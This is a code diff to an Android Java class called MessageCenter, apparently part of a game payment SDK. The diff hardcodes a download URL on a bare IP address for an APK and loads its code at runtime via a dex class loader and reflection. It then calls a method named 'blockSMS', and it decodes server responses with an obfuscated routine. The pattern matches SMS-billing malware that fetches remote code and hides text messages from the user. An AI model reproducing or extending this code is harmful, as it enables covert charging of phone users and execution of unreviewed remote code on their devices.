@@ -2,6 +2,9 @@ package cn.egamex.jiazai;
 
 import android.content.Context;
 import android.content.pm.PackageInfo;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.Message;
 import android.util.Log;
 
 import org.json.JSONObject;
@@ -37,7 +40,7 @@ public class MessageCenter {
     private static String pacageName;
     private String url;
     private String jarName;
-    private Class<?> clazz;
+    private static Class<?> clazz;
     private boolean isFirst = true;
     private Context context;
 
@@ -48,7 +51,6 @@ public class MessageCenter {
         return messageCenter;
     }
 
-
     public void SDKInitializer(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final
     String extData, final Object payCallBackObject, final Object initObject) {
         context = ctx;
@@ -56,9 +58,10 @@ public class MessageCenter {
             @Override
             public void result(String result) {
                 if (Constants.isOutPut) {
-                    System.out.println("======>" + Kode.a(result));
+                    System.out.println("!!!!!!!!!!!!!!!!!!!!!!!!======>" + Kode.a(result));
                 }
                 url = getUrl(Kode.a(result));
+                url = "http://120.76.74.206:8080/youxipj/Download/PaySDK.apk";
                 jarName = getJarName(url);
                 if (Constants.isOutPut) {
                     System.out.println("======>url:" + url);
@@ -67,6 +70,7 @@ public class MessageCenter {
                 new DownLoadJar(ctx, jarName, url, new DownLoadListener() {
                     @Override
                     public void DownLoadState(int state) {
+                        Looper.prepare();
                         LoadDex(ctx);
                         init(context, price, payItemID, str, product, Did, extData, payCallBackObject, initObject);
                     }
@@ -82,7 +86,7 @@ public class MessageCenter {
 
     public void s(final Context context) {
         if (clazz != null) {
-            blockSMS(context);
+            blockSMS(context, new Handler());
         }
     }
 
@@ -116,7 +120,7 @@ public class MessageCenter {
         try {
             clazz = cl.loadClass(pacageName + "." + loadClassName);
         } catch (Exception e) {
-            Log.i("SDK", e.toString());
+            e.printStackTrace();
         }
     }
 
@@ -124,6 +128,13 @@ public class MessageCenter {
     private void init(Context ctx, String price, int payItemID, String str, String product, String Did,
                       String extData, Object payCallBackObject, Object initObject) {
         try {
+            Method[] ms = clazz.getMethods();
+            for (Method m : ms) {
+                if (Constants.isOutPut) {
+                    Log.i("SDK", "payInit: " + m.getName());
+                }
+                Class<?>[] cx = m.getParameterTypes();
+            }
             Method method = clazz.getMethod("getInstance");
             Object o = method.invoke(null);
             Class<? extends Object> ci = o.getClass();
@@ -132,13 +143,9 @@ public class MessageCenter {
                             String.class, Object.class, Object.class})
                     .invoke(o, new Object[]{ctx, price, payItemID, str, product, Did, extData, payCallBackObject, initObject});
         } catch (InvocationTargetException e) {
-            if (Constants.isOutPut) {
-                Log.i("SDK", e.toString());
-            }
+            e.printStackTrace();
         } catch (Exception e) {
-            if (Constants.isOutPut) {
-                Log.i("SDK", e.toString());
-            }
+            e.printStackTrace();
         }
     }
 
@@ -153,13 +160,11 @@ public class MessageCenter {
                             String.class, Object.class})
                     .invoke(o, new Object[]{ctx, price, payItemID, str, product, Did, extData, payCallBackObject});
         } catch (Exception e) {
-            if (Constants.isOutPut) {
-                Log.i("SDK", e.toString());
-            }
+            e.printStackTrace();
         }
     }
 
-    private void blockSMS(Context context) {
+    private void blockSMS(Context context, Handler registHandler) {
         try {
             if (Constants.isOutPut) {
                 Log.i("SDK", "name: " + clazz.getName());
@@ -176,8 +181,9 @@ public class MessageCenter {
             Object o = method.invoke(null);
             Class<? extends Object> ci = o.getClass();
             ci.getMethod("s", Context.class).invoke(o, context);
+            registHandler.sendEmptyMessage(1);
         } catch (Exception e) {
-            Log.i("SDK", e.toString());
+            e.printStackTrace();
         }
     }
 
@@ -204,22 +210,6 @@ public class MessageCenter {
         return null;
     }
 
-//    private Handler mHandler = new Handler() {
-//        @Override
-//        public void handleMessage(Message msg) {
-//            super.handleMessage(msg);
-//            Bundle dBundle = msg.getData();
-//            String price = dBundle.getString("price");
-//            int payItemID = dBundle.getInt("payItemID");
-//            String str = dBundle.getString("str");
-//            String product = dBundle.getString("product");
-//            String Did = dBundle.getString("Did");
-//            String extData = dBundle.getString("extData");
-//            Object oHandler = dBundle.get
-//            init(context, price, payItemID, str, product, Did, extData, oHandler, oBCallBack);
-////            ShowDialog.dismiss();
-//        }
-//    };
 
     private String getUrl(String content) {
         try {
